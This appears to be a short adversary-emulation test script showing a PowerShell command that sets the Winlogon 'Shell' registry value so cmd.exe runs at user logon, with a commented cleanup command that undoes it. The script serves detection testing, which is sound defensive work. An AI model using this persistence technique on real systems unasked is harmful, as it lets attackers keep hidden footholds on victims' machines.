#Atomic Test #1 - Winlogon Shell Key Persistence - PowerShell

Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force

# Cleanup Commands:
# Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
